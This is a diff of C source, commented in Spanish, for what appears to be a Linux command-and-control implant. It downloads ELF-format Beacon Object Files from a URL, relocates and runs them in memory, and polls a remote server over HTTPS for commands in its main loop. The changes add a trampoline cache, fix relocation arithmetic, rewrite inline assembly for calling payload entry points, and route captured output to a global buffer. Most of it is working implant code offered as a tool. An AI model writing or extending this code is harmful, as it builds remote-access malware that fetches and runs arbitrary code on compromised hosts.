@@ -66,6 +66,16 @@ typedef struct {
     void **ptr;
 } SymbolResolver;
 
+// === CACHE DE TRAMPOLINES ===
+typedef struct {
+    void* original;
+    void* trampoline;
+} TrampolineCache;
+
+static TrampolineCache* g_trampoline_cache = NULL;
+static size_t g_cache_count = 0;
+static size_t g_cache_capacity = 0;
+
 // Variables intermedias
 static void* g_printf_ptr = (void*)printf;
 static void* g_strlen_ptr = (void*)strlen;
@@ -109,18 +119,53 @@ static void __attribute__((noinline)) call_bof_isolated(bof_func_t func, char* a
 static void __attribute__((noinline))
 call_bof_isolated(bof_func_t func, char* args, uintptr_t arglen)
 {
+    // CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call
+    // Después de 'call', RSP está desalineado 8 bytes (por el push del return address)
+    // Entonces necesitamos RSP % 16 == 8 justo antes del call
+
     asm volatile(
+        // Guardar frame pointer
         "push %%rbp\n\t"
         "mov %%rsp, %%rbp\n\t"
-        "and $-16, %%rsp\n\t"
+
+        // Guardar callee-saved registers
+        "push %%rbx\n\t"
+        "push %%r12\n\t"
+        "push %%r13\n\t"
+        "push %%r14\n\t"
+        "push %%r15\n\t"
+
+        // Calcular alineación
+        // Ahora tenemos: push rbp (8) + 5 push (40) = 48 bytes = desalineado
+        // Queremos RSP % 16 == 8 antes del call (porque call empuja 8 más)
+        // Actualmente RSP % 16 == 0 (porque 48 % 16 == 0)
+        // Necesitamos restar 8 para que RSP % 16 == 8
         "sub $8, %%rsp\n\t"
-        "mov %0, %%rdi\n\t"
-        "mov %1, %%rsi\n\t"
+
+        // Preparar argumentos para la función BOF
+        "mov %0, %%rdi\n\t"          // primer arg: char* args
+        "mov %1, %%rsi\n\t"          // segundo arg: int alen
+
+        // Limpiar AL (indica que no hay args XMM para variadics)
+        "xor %%eax, %%eax\n\t"
+
+        // CALL: esto empuja return address (8 bytes)
+        // Después del call, RSP % 16 == 0 (perfecto para movaps)
         "call *%2\n\t"
-        "leave\n\t"
+
+        // Restaurar stack
+        "add $8, %%rsp\n\t"
+        "pop %%r15\n\t"
+        "pop %%r14\n\t"
+        "pop %%r13\n\t"
+        "pop %%r12\n\t"
+        "pop %%rbx\n\t"
+        "pop %%rbp\n\t"
         :
         : "r"(args), "r"(arglen), "r"(func)
-        : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11", "memory"
+        : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11",
+        "xmm0", "xmm1", "xmm2", "xmm3", "xmm4", "xmm5", "xmm6", "xmm7",
+        "memory", "cc"
     );
 }
 // === BEACON API ===
@@ -192,6 +237,42 @@ static void cleanup_trampolines(void) {
     g_trampolines = NULL;
     g_trampolines_count = 0;
     g_trampolines_capacity = 0;
+
+    // Limpiar cache
+    free(g_trampoline_cache);
+    g_trampoline_cache = NULL;
+    g_cache_count = 0;
+    g_cache_capacity = 0;
+}
+
+static void* get_or_create_trampoline(void* target) {
+    if (!target) return NULL;
+
+    // Buscar en cache
+    for (size_t i = 0; i < g_cache_count; i++) {
+        if (g_trampoline_cache[i].original == target) {
+            return g_trampoline_cache[i].trampoline;
+        }
+    }
+
+    // Crear nuevo
+    void* tramp = create_trampoline(target);
+    if (!tramp) return NULL;
+
+    // Agregar a cache
+    if (g_cache_count >= g_cache_capacity) {
+        size_t new_cap = g_cache_capacity ? g_cache_capacity * 2 : 8;
+        TrampolineCache* tmp = realloc(g_trampoline_cache, new_cap * sizeof(TrampolineCache));
+        if (!tmp) return tramp;
+        g_trampoline_cache = tmp;
+        g_cache_capacity = new_cap;
+    }
+
+    g_trampoline_cache[g_cache_count].original = target;
+    g_trampoline_cache[g_cache_count].trampoline = tramp;
+    g_cache_count++;
+
+    return tramp;
 }
 
 // === CURL WRITE CALLBACK ===
@@ -531,33 +612,38 @@ int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
                 continue;
             }
 
-            symbol_addr = (void*)((uintptr_t)symbol_addr + r->r_addend);
 
             switch (ELF64_R_TYPE(r->r_info)) {
                 case R_X86_64_64:
-                    *(uint64_t*)loc = (uint64_t)symbol_addr;
+                    *(uint64_t*)loc = (uint64_t)((uintptr_t)symbol_addr + r->r_addend);
                     break;
-                case R_X86_64_32:
-                    if ((uintptr_t)symbol_addr > 0xFFFFFFFF) {
+                case R_X86_64_32: {
+                    uintptr_t value = (uintptr_t)symbol_addr + r->r_addend;
+                    if (value > 0xFFFFFFFF) {
                         fprintf(stderr, "[!] R_X86_64_32 out of range\n");
                         continue;
                     }
-                    *(uint32_t*)loc = (uint32_t)(uintptr_t)symbol_addr;
+                    *(uint32_t*)loc = (uint32_t)value;
                     break;
+                }
                 case R_X86_64_PC32:
                 case R_X86_64_PLT32: {
-                    int64_t offset = (int64_t)symbol_addr - (int64_t)loc;
+                    int64_t offset = (int64_t)symbol_addr + r->r_addend - (int64_t)loc;
+
                     if (offset < INT32_MIN || offset > INT32_MAX) {
-                        void* trampoline = create_trampoline(symbol_addr);
+                        fprintf(stderr, "[DEBUG] Offset fuera de rango (%ld) para %s, creando trampolín\n",
+                                offset, sym_name);
+                        void* trampoline = get_or_create_trampoline(symbol_addr);  // ← Cambio aquí
                         if (!trampoline) {
                             fprintf(stderr, "[!] Trampolín falló para %s\n", sym_name);
                             continue;
                         }
-                        offset = (int64_t)trampoline - (int64_t)loc;
+                        offset = (int64_t)trampoline + r->r_addend - (int64_t)loc;
                         if (offset < INT32_MIN || offset > INT32_MAX) {
                             fprintf(stderr, "[!] Trampolín fuera de rango para %s\n", sym_name);
                             continue;
                         }
+                        fprintf(stderr, "[DEBUG] Trampolín reutilizado/creado en %p para %s\n", trampoline, sym_name);
                     }
                     *(uint32_t*)loc = (uint32_t)offset;
                     break;
@@ -592,7 +678,9 @@ int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
         fprintf(stderr, "[!] Entry '%s' not found\n", functionname);
         goto cleanup;
     }
-
+    fprintf(stderr, "[DEBUG] BeaconPrintf addr: %p\n", (void*)BeaconPrintf);
+    fprintf(stderr, "[DEBUG] g_BeaconPrintf_ptr: %p\n", g_BeaconPrintf_ptr);
+    fflush(stderr);
     g_output_len = 0;
     g_beacon_output[0] = '\0';
     call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);
@@ -663,50 +751,43 @@ unsigned char* download_bof(const char* url, size_t* out_size)
 char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                           char* args, int arglen, int* out_len)
 {
-    int pipefd[2];
-    if (pipe(pipefd) == -1) {
-        perror("pipe");
-        *out_len = 0;
-        return strdup("");
-    }
+    fprintf(stderr, "[DEBUG] run_bof_and_capture: ENTRY\n");
+    fflush(stderr);
 
-    int stdout_backup = dup(STDOUT_FILENO);
-    if (stdout_backup == -1) {
-        close(pipefd[0]);
-        close(pipefd[1]);
-        *out_len = 0;
-        return strdup("");
-    }
-
-    dup2(pipefd[1], STDOUT_FILENO);
-    close(pipefd[1]);
-
+    // Limpiar buffer global ANTES de ejecutar
     g_output_len = 0;
     g_beacon_output[0] = '\0';
+
+    fprintf(stderr, "[DEBUG] run_bof_and_capture: calling RunELF\n");
+    fflush(stderr);
+
+    // Ejecutar el BOF - esto escribe a g_beacon_output
     RunELF("go", elf_data, filesize, (unsigned char*)args, arglen);
-    fflush(stdout);
 
-    dup2(stdout_backup, STDOUT_FILENO);
-    close(stdout_backup);
+    fprintf(stderr, "[DEBUG] run_bof_and_capture: RunELF returned\n");
+    fprintf(stderr, "[DEBUG] run_bof_and_capture: g_output_len=%zu\n", g_output_len);
+    fprintf(stderr, "[DEBUG] run_bof_and_capture: g_beacon_output='%s'\n", g_beacon_output);
+    fflush(stderr);
 
-    char buffer[4096];
-    char *output = malloc(1);
-    output[0] = '\0';
-    size_t total = 0;
-
-    ssize_t n;
-    while ((n = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
-        buffer[n] = '\0';
-        char *tmp = realloc(output, total + n + 1);
-        if (!tmp) break;
-        output = tmp;
-        memcpy(output + total, buffer, n);
-        total += n;
+    // Alocar y copiar el output del buffer global
+    if (g_output_len == 0) {
+        *out_len = 0;
+        return strdup("");
     }
-    close(pipefd[0]);
 
-    *out_len = total;
-    printf("[DEBUG] run_bof_and_capture: leídos %zd bytes\n", total);
+    char *output = malloc(g_output_len + 1);
+    if (!output) {
+        *out_len = 0;
+        return strdup("");
+    }
+
+    memcpy(output, g_beacon_output, g_output_len);
+    output[g_output_len] = '\0';
+    *out_len = g_output_len;
+
+    fprintf(stderr, "[DEBUG] run_bof_and_capture: EXIT with %d bytes\n", *out_len);
+    fflush(stderr);
+
     return output;
 }
 
@@ -727,8 +808,8 @@ int main() {
         printf("[*] Checking for new command...\n");
 
         // 🔥 LIMPIAR BUFFER ANTES DE CADA COMANDO
-        g_output_len = 0;
-        g_beacon_output[0] = '\0';
+        //g_output_len = 0;
+        //g_beacon_output[0] = '\0';
 
         char* b64_resp = https_request(full_url, "GET", NULL);
         if (!b64_resp || strlen(b64_resp) == 0) {
